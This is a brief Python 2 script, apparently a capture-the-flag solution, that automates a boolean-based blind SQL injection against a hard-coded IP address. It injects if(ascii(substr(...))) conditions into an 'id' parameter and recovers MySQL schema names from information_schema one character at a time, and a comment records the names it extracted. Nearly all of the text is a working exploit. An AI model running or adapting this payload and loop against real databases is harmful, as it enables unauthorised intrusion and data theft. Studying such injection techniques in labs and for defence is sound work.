'''/?id=if(ascii(mid((select+group_concat(schema_name)+from+information_schema.schemata),1,1))>97,1,2)
'''
import requests

#baseurl = 'http://39.108.109.85:9001/?id=if(((select+schema_name+from+information_schema.schemata+limit+0,1)+regexp+{}),2,1)'
baseurl = 'http://39.108.109.85:9001/?id=if(ascii(substr((select+group_concat(schema_name)+from+information_schema.schemata),{},1))>{},1,2)'
flag = ''

for i in range(50): #information_schema,mysql,pepsi,performance_schema
  print i
  found = False
  for c in range(0x20, 0x7f):
    url = baseurl.format(i+1, c)
    r = requests.get(url)
    if '2' in r.text:
      found = True
      flag += chr(c)
      print flag
      break
  if not found:
    break
print flag